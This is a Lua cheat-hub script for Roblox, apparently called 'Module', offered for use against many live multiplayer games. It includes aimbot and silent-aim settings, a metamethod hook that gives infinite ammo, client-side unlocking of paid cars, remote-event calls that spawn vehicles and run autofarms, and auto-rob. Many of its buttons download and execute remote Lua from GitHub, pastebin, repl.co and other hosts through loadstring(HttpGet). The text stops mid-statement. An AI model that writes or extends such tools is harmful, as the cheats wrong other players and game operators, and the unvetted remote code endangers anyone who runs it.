local UI = game:GetObjects("rbxassetid://11399990461")[1]

if gethui then
	UI.Parent = gethui()
elseif syn.protect_gui then
	syn.protect_gui(UI)
	UI.Parent = game.CoreGui
else
	UI.Parent = game.CoreGui
end
wait(4)

UI:Destroy()

-- services
local players = game:GetService("Players")
local workspace = game:GetService("Workspace")
local runService = game:GetService("RunService")
local inputService = game:GetService("UserInputService")
local virtualUser = game:GetService("VirtualUser")
local lighting = game:GetService("Lighting")
local teleportService = game:GetService("TeleportService")

-- variables
local camera = workspace.CurrentCamera
local localplayer = players.LocalPlayer
local mouse = localplayer:GetMouse()
local curveStatus = { player = nil, i = 0 }
local fovCircle = Drawing.new("Circle")
local ambient = lighting.Ambient
local keybinds = {}
local xray = {}
local fonts = {}
for font, index in next, Drawing.Fonts do
	fonts[index] = font
end

getgenv().SecureMode = true

local espLibrary =
	loadstring(game:HttpGet("https://raw.githubusercontent.com/shlexware/Sirius/main/library/esp/esp.lua"))()
local Rayfield = loadstring(game:HttpGet("https://raw.githubusercontent.com/Module-Hub/Source/main/raysource"))()

-- functions
local function connect(signal, callback)
	local connection = signal:Connect(callback)
	table.insert(Rayfield.Connections, connection)
	return connection
end

local function getFlag(name)
	return Rayfield.Flags[name].Value
end

local function isR15(character)
	return character:FindFirstChild("UpperTorso") ~= nil
end

local function getHitpart(character)
	local hitpart = getFlag("combot_aimbot_hitpart")
	if hitpart == "Torso" and isR15(character) then
		hitpart = "UpperTorso"
	end
	return character:FindFirstChild(hitpart)
end

local function isCharacterPart(part)
	for _, player in next, players:GetPlayers() do
		if player.Character and part:IsDescendantOf(player.Character) then
			return true
		end
	end
	return false
end

local function wtvp(worldPosition)
	local screenPosition, inBounds = camera:WorldToViewportPoint(worldPosition)
	return Vector2.new(screenPosition.X, screenPosition.Y), inBounds, screenPosition.Z
end

local function getClosest(fov, teamcheck)
	local returns = {}
	local lastMagnitude = fov or math.huge
	for _, player in next, players:GetPlayers() do
		if (teamcheck and player.Team == localplayer.Team) or player == localplayer then
			continue
		end

		local character = player.Character
		local part = character and getHitpart(character)
		if character and part then
			local partPosition = part.Position
			if getFlag("combat_aimbot_prediction") then
				partPosition += part.Velocity * getFlag("combat_aimbot_predictioninterval")
			end

			local screenPosition, inBounds = wtvp(partPosition)
			local mousePosition = inputService:GetMouseLocation()
			local magnitude = (screenPosition - mousePosition).Magnitude
			if magnitude < lastMagnitude and inBounds then
				lastMagnitude = magnitude
				returns = table.pack(player, screenPosition, part)
			end
		end
	end
	return table.unpack(returns)
end

local function isVisible(part)
	return #camera:GetPartsObscuringTarget({ part.Position }, { camera, part.Parent, localplayer.Character }) == 0
end

local function bezierCurve(bezierType, t, p0, p1)
	if bezierType == "Linear" then
		return (1 - t) * p0 + t * p1
	else
		return (1 - t) ^ 2 * p0 + 2 * (1 - t) * t * (p0 + (p1 - p0) * Vector2.new(0.5, 0)) + t ^ 2 * p1
	end
end

local Window = Rayfield:CreateWindow({
	Name = "Module",
	LoadingTitle = "Module",
	LoadingSubtitle = "by Ryzen",
	ConfigurationSaving = {
		Enabled = false,
		FolderName = nil, -- Create a custom folder for your hub/game
		FileName = "ModuleConfiguration",
	},
	Discord = {
		Enabled = true,
		Invite = "KNTZHXBX9E", -- The Discord invite code, do not include discord.gg/
		RememberJoins = true, -- Set this to false to make them join the discord every time they load it up
	},
	KeySystem = true, -- Set this to true to use our key system
	KeySettings = {
		Title = "Module",
		Subtitle = "Module Key System",
		Note = "Module Key System",
		FileName = "ModuleKey",
		SaveKey = false,
		GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
		Key = "key",
	},
})

getgenv().DefaultCam = 1
getgenv().restock = true
getgenv().autofarm = true
getgenv().Start = true
getgenv().af = false
getgenv().ad = false
getgenv().as = false

_G.RadarSettings = {
	--- Radar settings
	RADAR_LINES = true, -- Displays distance rings + cardinal lines
	RADAR_LINE_DISTANCE = 50, -- The distance between each distance ring
	RADAR_SCALE = 1, -- Controls how "zoomed in" the radar display is
	RADAR_RADIUS = 125, -- The size of the radar itself
	RADAR_ROTATION = true, -- Toggles radar rotation. Looks kinda trippy when disabled
	SMOOTH_ROT = true, -- Toggles smooth radar rotation
	SMOOTH_ROT_AMNT = 30, -- Lower number is smoother, higher number is snappier
	CARDINAL_DISPLAY = true, -- Displays the four cardinal directions (north east south west) around the radar

	--- Marker settings
	DISPLAY_OFFSCREEN = true, -- Displays offscreen / off-radar markers
	DISPLAY_TEAMMATES = true, -- Displays markers that belong to your teammates
	DISPLAY_TEAM_COLORS = true, -- Displays your teammates markers with either a custom color (change Team_Marker) or with that teams TeamColor (enable USE_TEAM_COLORS)
	DISPLAY_FRIEND_COLORS = true, -- Displays your friends markers with a custom color (Friend_Marker). This takes priority over DISPLAY_TEAM_COLORS and DISPLAY_RGB
	DISPLAY_RGB_COLORS = false, -- Displays each marker with an RGB cycle. Takes priority over DISPLAY_TEAM_COLORS, but not DISPLAY_FRIEND_COLORS
	MARKER_SCALE_BASE = 1.25, -- Base scale that gets applied to markers
	MARKER_SCALE_MAX = 1.25, -- The largest scale that a marker can be
	MARKER_SCALE_MIN = 0.75, -- The smallest scale that a marker can be
	MARKER_FALLOFF = true, -- Affects the markers' scale depending on how far away the player is - bypasses SCALE_MIN and SCALE_MAX
	MARKER_FALLOFF_AMNT = 125, -- How close someone has to be for falloff to start affecting them
	OFFSCREEN_TRANSPARENCY = 0.3, -- Transparency of offscreen markers
	USE_FALLBACK = true, -- Enables an emergency "fallback mode" for StreamingEnabled games
	USE_QUADS = true, -- Displays radar markers as arrows instead of dots
	USE_TEAM_COLORS = false, -- Uses a team's TeamColor for marker colors
	VISIBLITY_CHECK = false, -- Makes markers that are not visible slightly transparent

	--- Theme
	RADAR_THEME = {
		Outline = Color3.fromRGB(35, 35, 45), -- Radar outline
		Background = Color3.fromRGB(25, 25, 35), -- Radar background
		DragHandle = Color3.fromRGB(50, 50, 255), -- Drag handle

		Cardinal_Lines = Color3.fromRGB(110, 110, 120), -- Color of the horizontal and vertical lines
		Distance_Lines = Color3.fromRGB(65, 65, 75), -- Color of the distance rings

		Generic_Marker = Color3.fromRGB(255, 25, 115), -- Color of a player marker without a team
		Local_Marker = Color3.fromRGB(115, 25, 255), -- Color of your marker, regardless of team
		Team_Marker = Color3.fromRGB(25, 115, 255), -- Color of your teammates markers. Used when DISPLAY_TEAM_COLORS is disabled
		Friend_Marker = Color3.fromRGB(25, 255, 115), -- Color of your friends markers. Used when DISPLAY_FRIEND_COLORS is enabled
	},
}

_G.Settings = {
	Auto_Farm_Level = false,
	Auto_New_World = false,
	Auto_Third_World = false,
	Auto_Farm_Chest = false,
	Auto_Farm_Chest_Hop = false,
	Auto_Elite_Hunter = false,
	Auto_Elite_Hunter_Hop = false,
	Auto_Spawn_Cake_Prince = true,
	Auto_Cake_Prince = false,
	Select_Boss = nil,
	Auto_Farm_Boss = false,
	Auto_Quest_Boss = true,
	Auto_Farm_All_Boss = false,
	Select_Distance = 30,
	Select_Health = 20,
	Select_Mode_Farm = "Normal Mode",
	Select_Bring_Mob_Mode = "Bring Mob [Normal]",
	Normal_Fast_Attack = true,
	Extra_Fast_Attack = true,
	Auto_Set_Spawn = true,
	Select_Level_to_Redeem_All_Code = 1,
	Auto_Redeem_All_Code = false,
	Select_Weapon = nil,
	Skill_Z = true,
	Skill_X = true,
	Skill_C = true,
	Skill_V = true,
	Auto_Saber = false,
	Auto_Saber_Hop = false,
	Auto_Pole = false,
	Auto_Pole_Hop = false,
	Auto_Farm_Scrap_and_Leather = false,
	Auto_Farm_Angel_Wing = false,
	Auto_Factory_Farm = false,
	Auto_Farm_Ectoplasm = false,
	Auto_Bartilo_Quest = false,
	Auto_Rengoku = false,
	Auto_Farm_Radioactive = false,
	Auto_Farm_Vampire_Fang = false,
	Auto_Farm_Mystic_Droplet = false,
	Auto_Evo_Race_V2 = false,
	Auto_Swan_Glasses = false,
	Auto_Swan_Glasses_Hop = false,
	Auto_Dragon_Trident = false,
	Auto_Dragon_Trident_Hop = false,
	Auto_Buy_Legendary_Sword = false,
	Auto_Buy_Enchancement = false,
	Auto_Soul_Reaper = false,
	Auto_Farm_GunPowder = false,
	Auto_Farm_Dragon_Scales = false,
	Auto_Soul_Reaper_Hop = false,
	Auto_Farm_Fish_Tail = false,
	Auto_Farm_Mini_Tusk = false,
	Auto_Farm_Magma_Ore = false,
	Auto_Farm_Bone = false,
	Auto_Farm_Conjured_Cocoa = false,
	Auto_Open_Dough_Dungeon = false,
	Auto_Yama = false,
	Auto_Trade_Bone = false,
	Auto_Rainbow_Haki = false,
	Auto_Rainbow_Haki_Hop = false,
	Auto_Musketeer_Hat = false,
	Auto_Holy_Torch = false,
	Auto_Canvander = false,
	Auto_Canvander_Hop = false,
	Auto_Twin_Hook = false,
	Auto_Twin_Hook_Hop = false,
	Auto_Serpent_Bow = false,
	Auto_Serpent_Bow_Hop = false,
	Auto_Superhuman = false,
	Auto_Fully_Superhuman = false,
	Auto_Death_Step = false,
	Auto_Fully_Death_Step = false,
	Auto_SharkMan_Karate = false,
	Auto_Fully_SharkMan_Karate = false,
	Auto_Electric_Claw = false,
	Auto_Dragon_Talon = false,
	Auto_God_Human = false,
	Auto_Stats_Kaitun = false,
	Auto_Stats_Melee = false,
	Auto_Stats_Defense = false,
	Auto_Stats_Sword = false,
	Auto_Stats_Gun = false,
	Auto_Stats_Devil_Fruit = false,
	Point = 1,
	No_clip = false,
	Infinit_Energy = false,
	Dodge_No_CoolDown = false,
	Infinit_Ability = false,
	Infinit_SkyJump = false,
	Infinit_Soru = false,
	Infinit_Range_Observation_Haki = false,
	Select_Size_Fov = 200,
	Show_Fov = false,
	Select_Player = nil,
	Spectate_Player = false,
	Teleport_to_Player = false,
	Auto_Kill_Player_Melee = false,
	Auto_Kill_Player_Gun = false,
	Select_Island = nil,
	Start_Tween_Island = false,
	Select_Dungeon = nil,
	Auto_Buy_Chips_Dungeon = false,
	Auto_Start_Dungeon = false,
	Auto_Next_Island = false,
	Kill_Aura = false,
	Auto_Awake = false,
	Auto_Buy_Law_Chip = false,
	Auto_Start_Law_Dungeon = false,
	Auto_Kill_Law = false,
	Select_Weapon_Law_Raid = nil,
	Select_Devil_Fruit = nil,
	Auto_Buy_Devil_Fruit = false,
	Auto_Random_Fruit = false,
	Auto_Bring_Fruit = false,
	Auto_Store_Fruit = false,
}

local DR = Window:CreateTab("Games", 7733799901) -- Title, Image

if game.PlaceId == 8436975214 then
	local Section = DR:CreateSection("Dangerous Speeds")
	local Button = DR:CreateButton({
		Name = "Unlock All Cars",
		Callback = function()
			local Car = Instance.new("StringValue")
			Car.Parent = game.Players.LocalPlayer.SavedCars
			Car.Name = "BRZ"
			local Car2 = Instance.new("StringValue")
			Car2.Parent = game.Players.LocalPlayer.SavedCars
			Car2.Name = "Fiat"
			local Car3 = Instance.new("StringValue")
			Car3.Parent = game.Players.LocalPlayer.SavedCars
			Car3.Name = "FordFiesta"
			local Car4 = Instance.new("StringValue")
			Car4.Parent = game.Players.LocalPlayer.SavedCars
			Car4.Name = "LamborghiniHurrie"
			local Car5 = Instance.new("StringValue")
			Car5.Parent = game.Players.LocalPlayer.SavedCars
			Car5.Name = "FerrariF40"
			local Car6 = Instance.new("StringValue")
			Car6.Parent = game.Players.LocalPlayer.SavedCars
			Car6.Name = "AudiR8"
			local Car7 = Instance.new("StringValue")
			Car7.Parent = game.Players.LocalPlayer.SavedCars
			Car7.Name = "LamborghiniAventador"
			local Car8 = Instance.new("StringValue")
			Car8.Parent = game.Players.LocalPlayer.SavedCars
			Car8.Name = "PorscheGT"
			local Car9 = Instance.new("StringValue")
			Car9.Parent = game.Players.LocalPlayer.SavedCars
			Car9.Name = "TeslaCyber3"
			local Car10 = Instance.new("StringValue")
			Car10.Parent = game.Players.LocalPlayer.SavedCars
			Car10.Name = "ForteStare"

			print("You have Received all the vehicles have fun @ryzen")
		end,
	})
end
if game.PlaceId == 2262441883 then
	local Section = DR:CreateSection("Electric State DarkRP")
	local Button = DR:CreateButton({
		Name = "Get Jetpack",
		Callback = function()
			clientModel.Name = "Jetpack"
			clientMain.Name = "Main"
			clientMain.Parent = model
			clientModel.Parent = game:GetService("Workspace")[game:GetService("Players").LocalPlayer.Name].Util
		end,
	})
end
if game.PlaceId == 3260590327 then
	local Section = DR:CreateSection("Tower Defense Simulator")
	local Button = DR:CreateButton({
		Name = "Auto Collect razors",
		Callback = function()
			repeat
				wait()
			until game:IsLoaded()
			local RazorTable = {}
			for i, v in next, workspace:GetChildren() do
				if v:IsA("MeshPart") and v.Name == "PhilipsRazor" and not table.find(RazorTable, v) then
					table.insert(RazorTable, v)
				end
			end
			Workspace.ChildAdded:Connect(function(Instance)
				wait(0.5)
				if
					Instance:IsA("MeshPart")
					and Instance.Name == "PhilipsRazor"
					and not table.find(RazorTable, Instance)
				then
					table.insert(RazorTable, Instance)
				end
			end)
			task.spawn(function()
				while true do
					wait()
					for i = 1, #RazorTable do
						if RazorTable[i] and RazorTable[i].CFrame.Y < 200 then
							game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = RazorTable[i].CFrame
						elseif not RazorTable[i] then
							table.remove(RazorTable, i)
						end
					end
				end
			end)
		end,
	})
end
if game.PlaceId == 2473334918 then
	local Section = DR:CreateSection("🔥🚘Gas Station Simulator")
	local Button = DR:CreateButton({
		Name = "Sell Gasoline",
		Callback = function()
			game.ReplicatedStorage.Events.MaxFuelAction:FireServer(
				game.ReplicatedStorage.Values.Items.FuelTypes.gasoline,
				"sell"
			)
		end,
	})
	local Button = DR:CreateButton({
		Name = "Sell Hydro",
		Callback = function()
			game.ReplicatedStorage.Events.MaxFuelAction:FireServer(
				game.ReplicatedStorage.Values.Items.FuelTypes.hydro,
				"sell"
			)
		end,
	})
end
if game.PlaceId == 443406476 then
	local Section = DR:CreateSection("Project Lazarus: 💀 ZOMBIES 💀")
	local Button = DR:CreateButton({
		Name = "Unlimtied Money",
		Callback = function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/yeerma/such/main/thefunni"))()
		end,
	})
	local Button = DR:CreateButton({
		Name = "Gun and Knife Modifications",
		Callback = function()
			loadstring(game:HttpGet("https://personal.zt0ht.repl.co/Storage/mod.lua"))()
		end,
	})
	local Button = DR:CreateButton({
		Name = "Infinite Ammo",
		Callback = function()
			local old
			old = hookmetamethod(
				game,
				"__namecall",
				newcclosure(function(self, ...)
					local args = { ... }
					if not checkcaller() and getnamecallmethod() == "FireServer" and tostring(self) == "SendData" then
						return
					end
					return old(self, ...)
				end)
			)

			folder = game:GetService("Players").LocalPlayer.Backpack

			for i, v in pairs(folder:GetChildren()) do
				if v:IsA("ModuleScript") then
					local gun = require(v)
					gun.StoredAmmo = math.huge
					gun.Ammo = math.huge
					gun.Damage = { Max = 1500000, Min = 10000 }
					gun.Spread = { Min = 0, Max = 0 }
					gun.Semi = false
					gun.Pitch = { Min = 0, Max = 0 }
					gun.ViewKick = { Pitch = { Min = 0, Max = 0 }, Yaw = { Min = 0, Max = 0 } }
				end
			end

			folder.ChildAdded:connect(function(child)
				if child.ClassName == "ModuleScript" then
					task.wait(1)
					local gun = require(child)
					gun.StoredAmmo = math.huge
					gun.Ammo = math.huge
					gun.Damage = { Max = math.huge, Min = math.huge }
					gun.Spread = { Min = 0, Max = 0 }
					gun.Semi = false
					gun.Pitch = { Min = 0, Max = 0 }
					gun.ViewKick = { Pitch = { Min = 0, Max = 0 }, Yaw = { Min = 0, Max = 0 } }
				end
			end)
		end,
	})
end
if game.PlaceId == 292439477 then
	local Section = DR:CreateSection("Phantom Forces")
	local Button = DR:CreateButton({
		Name = "Module Phantom Forces",
		Callback = function()
			loadstring(game:HttpGet("https://personal.zt0ht.repl.co/Storage/universal.lua"))()
		end,
	})
end
if game.PlaceId == 6459707978 then
	local Section = DR:CreateSection("Delivery Simulator")
	local Button = DR:CreateButton({
		Name = "Restock",
		Callback = function()
			loadstring(game:HttpGet("https://pastebin.com/raw/LXHi7HWj"))()
		end,
	})
	local Button = DR:CreateButton({
		Name = "Moonmap",
		Callback = function()
			loadstring(game:HttpGet("https://pastebin.com/raw/bFNiqrzQ"))()
		end,
	})
end

if game.PlaceId == 10969817967 then
	local Section = DR:CreateSection("Construction Simulator")
	local Button = DR:CreateButton({
		Name = "Upgrade earnings",
		Callback = function()
			local args = {
				[1] = "Buy Upgrade",
				[2] = "Earning",
			}

			game:GetService("ReplicatedStorage").Main.Remotes.Event:FireServer(unpack(args))
		end,
	})
	local Button = DR:CreateButton({
		Name = "Upgrade Speed",
		Callback = function()
			local args = {
				[1] = "Buy Upgrade",
				[2] = "Speed",
			}

			game:GetService("ReplicatedStorage").Main.Remotes.Event:FireServer(unpack(args))
		end,
	})
	local Button = DR:CreateButton({
		Name = "Upgrade Builders",
		Callback = function()
			local args = {
				[1] = "Buy Upgrade",
				[2] = "Builders",
			}

			game:GetService("ReplicatedStorage").Main.Remotes.Event:FireServer(unpack(args))
		end,
	})
	local Button = DR:CreateButton({
		Name = "Click Worker Boost",
		Callback = function()
			local args = {
				[1] = "Click Worker Boost",
			}

			game:GetService("ReplicatedStorage").Main.Remotes.Event:FireServer(unpack(args))
		end,
	})
	local Button = DR:CreateButton({
		Name = "Spin",
		Callback = function()
			local args = {
				[1] = "Try Spin",
				[2] = 1,
			}

			game:GetService("ReplicatedStorage").Main.Remotes.Function:InvokeServer(unpack(args))
		end,
	})
end

if game.PlaceId == 1224212277 then
	local Section = DR:CreateSection("Mad City: Chapter 2")
	local Button = DR:CreateButton({
		Name = "AutoRob",
		Callback = function()
			--Discord: discord.gg/NekoHub

			loadstring(game:HttpGet("https://nekoscripts.xyz/neko/Scripts/Auto_Rob.lua"))()
			-- The function that takes place when the button is pressed
		end,
	})

	local Button = DR:CreateButton({
		Name = "Silent Aim [OP]",
		Callback = function()
			getgenv().fov = 260 -- Field of View: The silent aim is only targetted at the target inside the fov's radius.
			getgenv().bodypart = "Head" -- Targetting: "Head", "Torso". For example: Using "Head" will only deal headshots.
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Cesare0328/my-scripts/main/SAMCH2", true))()
			-- The function that takes place when the button is pressed
		end,
	})

	local Button = DR:CreateButton({
		Name = "Anti-AFK",
		Callback = function()
			local vu = game:GetService("VirtualUser")
			game:GetService("Players").LocalPlayer.Idled:connect(function()
				vu:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
				wait(1)
				vu:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
			end)
			-- The function that takes place when the button is pressed
		end,
	})
end

if game.PlaceId == 2512643572 then
	local Section = DR:CreateSection("Bubble-Gum-Simulator")
	local Toggle = DR:CreateToggle({
		Name = "Snowflake Autofarm",
		CurrentValue = false,
		Flag = "Toggle1",
		Callback = function(Value)
			if Value then
				getgenv().autoFarm = true
				while getgenv().autoFarm == true do
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(
						37.5121346,
						271.314178,
						1483.34351,
						0.519202173,
						1.27605961e-08,
						-0.854651451,
						3.80401346e-08,
						1,
						3.80402057e-08,
						0.854651451,
						-5.22616155e-08,
						0.519202173
					)
					wait(0.8)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(
						40.116436,
						271.566315,
						1483.64429,
						0.559021115,
						-1.86177494e-05,
						-0.829153419,
						-1.36960227e-06,
						1,
						-2.33773208e-05,
						0.829153419,
						1.42040262e-05,
						0.559021115
					)
					wait(0.8)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(
						39.7298393,
						271.315582,
						1486.35632,
						0.578804731,
						5.30380788e-08,
						-0.815466166,
						-3.80399925e-08,
						1,
						3.80400245e-08,
						0.815466166,
						9.0025809e-09,
						0.578804731
					)
					wait(0.8)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(
						40.5886002,
						271.316071,
						1487.46118,
						0.55816257,
						-1.03305693e-08,
						-0.829731584,
						-3.80400849e-08,
						1,
						-3.80401595e-08,
						0.829731584,
						5.27956558e-08,
						0.55816257
					)
					wait(0.8)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(
						41.6921463,
						271.316559,
						1488.51709,
						0.581975281,
						8.7961487e-09,
						-0.813206494,
						3.80401843e-08,
						1,
						3.80402732e-08,
						0.813206494,
						-5.30730233e-08,
						0.581975281
					)
					wait(0.8)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(
						38.3999863,
						271.31723,
						1488.8717,
						0.572694719,
						9.39879463e-09,
						-0.819768727,
						3.80401843e-08,
						1,
						3.80402518e-08,
						0.819768727,
						-5.29696038e-08,
						0.572694719
					)
					wait(0.8)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(
						36.9076538,
						271.316254,
						1486.74243,
						0.574148178,
						-9.30472766e-09,
						-0.818751395,
						-3.80402199e-08,
						1,
						-3.80401808e-08,
						0.818751395,
						5.29861843e-08,
						0.574148178
					)
					wait(0.8)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(
						35.9316063,
						271.315582,
						1485.35071,
						0.57415545,
						9.30426225e-09,
						-0.818746269,
						3.80401382e-08,
						1,
						3.8040131e-08,
						0.818746269,
						-5.29861701e-08,
						0.57415545
					)
				end
			else
				getgenv().autoFarm = false
			end
		end,
	})

	local Toggle = DR:CreateToggle({
		Name = "Auto Blow",
		CurrentValue = false,
		Flag = "Toggle1",
		Callback = function(Value)
			if Value then
				getgenv().autoBlow = true
				while getgenv().autoBlow == true do
					wait(0.001)
					local args = {
						[1] = "BlowBubble",
					}
					game:GetService("ReplicatedStorage").NetworkRemoteEvent:FireServer(unpack(args))
				end
			else
				getgenv().autoBlow = false
			end
		end,
	})

	local Toggle = DR:CreateToggle({
		Name = "Auto Sell",
		CurrentValue = false,
		Flag = "Toggle1",
		Callback = function(Value)
			if Value then
				getgenv().autoSell = true
				while getgenv().autoSell == true do
					wait(0.001)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(
						-146.899704,
						45.8002815,
						-155.838211,
						0.472316355,
						-5.14966416e-08,
						-0.881429136,
						3.80401559e-08,
						1,
						-3.80401026e-08,
						0.881429136,
						-1.55627369e-08,
						0.472316355
					)
					local args = {
						[1] = "SellBubble",
						[2] = "Sell",
					}
					game:GetService("ReplicatedStorage").NetworkRemoteEvent:FireServer(unpack(args))
				end
			else
				getgenv().autoSell = false
			end
		end,
	})

	local Button = DR:CreateButton({
		Name = "Spin Prize Wheel",
		Callback = function()
			local args = {
				[1] = "SpinToWin",
			}
			game:GetService("ReplicatedStorage").NetworkRemoteEvent:FireServer(unpack(args))
		end,
	})

	local Button = DR:CreateButton({
		Name = "Teleport Event World",
		Callback = function()
			local args = {
				[1] = "Teleport",
				[2] = "EventSpawn",
			}

			game:GetService("ReplicatedStorage").NetworkRemoteEvent:FireServer(unpack(args))
		end,
	})

	local Slider = DR:CreateSlider({
		Name = "Walkspeed",
		Range = { 16, 170 },
		Increment = 10,
		Suffix = "Walkspeed",
		CurrentValue = 16,
		Flag = "Slider1",
		Callback = function(Value)
			game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
		end,
	})

	local Slider = DR:CreateSlider({
		Name = "Jumppower",
		Range = { 50, 350 },
		Increment = 10,
		Suffix = "Jumppower",
		CurrentValue = 50,
		Flag = "Slider1",
		Callback = function(Value)
			game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value
		end,
	})

	local Slider = DR:CreateSlider({
		Name = "Field Of View",
		Range = { 70, 120 },
		Increment = 10,
		Suffix = "Field Of View",
		CurrentValue = 70,
		Flag = "Slider1",
		Callback = function(Value)
			game.Workspace.CurrentCamera.FieldOfView = Value
		end,
	})

	local Slider = DR:CreateSlider({
		Name = "Gravity",
		Range = { 1, 400 },
		Increment = 10,
		Suffix = "Gravity",
		CurrentValue = 16,
		Flag = "Slider1",
		Callback = function(Value)
			game.Workspace.Gravity = Value
		end,
	})

	-- // Auto Hatching SECTION \\
	local Tab = Window:CreateTab("Auto Hatching")
	local Section = Tab:CreateSection("Auto Hatching")

	local Toggle = DR:CreateToggle({
		Name = "Auto Hatch Common Egg",
		CurrentValue = false,
		Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
		Callback = function(Value)
			if Value then
				getgenv().autoHatch = true
				while getgenv().autoHatch == true do
					wait(0.001)
					local args = {
						[1] = "PurchaseEgg",
						[2] = "Common Egg",
					}
					game:GetService("ReplicatedStorage").NetworkRemoteEvent:FireServer(unpack(args))
				end
			else
				getgenv().autoHatch = false
			end
		end,
	})

	local Toggle = DR:CreateToggle({
		Name = "Auto Hatch Spotted Egg",
		CurrentValue = false,
		Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
		Callback = function(Value)
			if Value then
				getgenv().autoHatch = true
				while getgenv().autoHatch == true do
					wait(0.001)
					local args = {
						[1] = "PurchaseEgg",
						[2] = "Spotted Egg",
					}
					game:GetService("ReplicatedStorage").NetworkRemoteEvent:FireServer(unpack(args))
				end
			else
				getgenv().autoHatch = false
			end
		end,
	})

	local Toggle = DR:CreateToggle({
		Name = "Auto Hatch Spikey Egg",
		CurrentValue = false,
		Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
		Callback = function(Value)
			if Value then
				getgenv().autoHatch = true
				while getgenv().autoHatch == true do
					wait(0.001)
					local args = {
						[1] = "PurchaseEgg",
						[2] = "Spikey Egg",
					}
					game:GetService("ReplicatedStorage").NetworkRemoteEvent:FireServer(unpack(args))
				end
			else
				getgenv().autoHatch = false
			end
		end,
	})
end

if game.PlaceId == 920587237 then
	local Section = DR:CreateSection("Adopt Me!")
	local Toggle = DR:CreateButton({
		Name = "Pet AutoFarm",
		Callback = function()
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local GingerbreadMarkers = ReplicatedStorage.Resources.IceSkating.GingerbreadMarkers

			for i, v in pairs(debug.getupvalue(require(ReplicatedStorage.Fsys).load("RouterClient").init, 4)) do
				v.Name = i
			end
			spawn(function()
				while wait() and Start do
					pcall(function()
						for i, v in pairs(GingerbreadMarkers:GetChildren()) do
							if v:IsA("BasePart") then
								ReplicatedStorage.API
									:FindFirstChild("WinterEventAPI/PickUpGingerbread")
									:InvokeServer(v.Name)
							end
						end
						ReplicatedStorage.API:FindFirstChild("WinterEventAPI/RedeemPendingGingerbread"):FireServer()
						ReplicatedStorage.API:FindFirstChild("WinterEventAPI/SubmitIceSkatingTime"):FireServer(0)
					end)
				end
			end)
		end,
	})
end

if game.PlaceId == 9601565001 then
	local Section = DR:CreateSection("Car Crash System")
	local Button = DR:CreateButton({
		Name = "Tuned Tyrota Cupra",
		Callback = function()
			-- Script generated by SimpleSpy - credits to exx#9394

			local args = {
				[1] = "[TIER 2] Tyrota cupra",
			}

			game:GetService("ReplicatedStorage").SpawnCar:FireServer(unpack(args))

			-- The function that takes place when the button is pressed
		end,
	})

	local Button = DR:CreateButton({
		Name = "Tuned Sedan",
		Callback = function()
			-- Script generated by SimpleSpy - credits to exx#9394

			local args = {
				[1] = "[TIER 2] Sedan",
			}

			game:GetService("ReplicatedStorage").SpawnCar:FireServer(unpack(args))

			-- The function that takes place when the button is pressed
		end,
	})

	local Button = DR:CreateButton({
		Name = "Tuned Cab",
		Callback = function()
			-- Script generated by SimpleSpy - credits to exx#9394

			local args = {
				[1] = "[TIER 2] Cab",
			}

			game:GetService("ReplicatedStorage").SpawnCar:FireServer(unpack(args))

			-- The function that takes place when the button is pressed
		end,
	})

	local Button = DR:CreateButton({
		Name = "Protected Sedan",
		Callback = function()
			-- Script generated by SimpleSpy - credits to exx#9394

			local args = {
				[1] = "[TIER 2] Protected Sedan",
			}

			game:GetService("ReplicatedStorage").SpawnCar:FireServer(unpack(args))

			-- The function that takes place when the button is pressed
		end,
	})

	local Button = DR:CreateButton({
		Name = "SWAT Station Truck",
		Callback = function()
			-- Script generated by SimpleSpy - credits to exx#9394

			local args = {
				[1] = "[TIER 2] SWAT truck",
			}

			game:GetService("ReplicatedStorage").SpawnCar:FireServer(unpack(args))

			-- The function that takes place when the button is pressed
		end,
	})

	local Button = DR:CreateButton({
		Name = "Big Sedan",
		Callback = function()
			-- Script generated by SimpleSpy - credits to exx#9394

			local args = {
				[1] = "[TIER 2] Big Sedan",
			}

			game:GetService("ReplicatedStorage").SpawnCar:FireServer(unpack(args))

			-- The function that takes place when the button is pressed
		end,
	})

	local Button = DR:CreateButton({
		Name = "Tuned Tyrota Chest",
		Callback = function()
			-- Script generated by SimpleSpy - credits to exx#9394

			local args = {
				[1] = "[TIER 2] Tyrota chest",
			}

			game:GetService("ReplicatedStorage").SpawnCar:FireServer(unpack(args))

			-- The function that takes place when the button is pressed
		end,
	})

	local Button = DR:CreateButton({
		Name = "[NUKE] Fuel Truck",
		Callback = function()
			-- Script generated by SimpleSpy - credits to exx#9394

			local args = {
				[1] = "[TIER 2] Fuel truck",
			}

			game:GetService("ReplicatedStorage").SpawnCar:FireServer(unpack(args))

			-- The function that takes place when the button is pressed
		end,
	})

	local Button = DR:CreateButton({
		Name = "Cherry Truck (2 Trailer)",
		Callback = function()
			-- Script generated by SimpleSpy - credits to exx#9394

			local args = {
				[1] = "[TIER 2] Truck trailer",
			}

			game:GetService("ReplicatedStorage").SpawnCar:FireServer(unpack(args))

			-- The function that takes place when the button is pressed
		end,
	})

	local Button = DR:CreateButton({
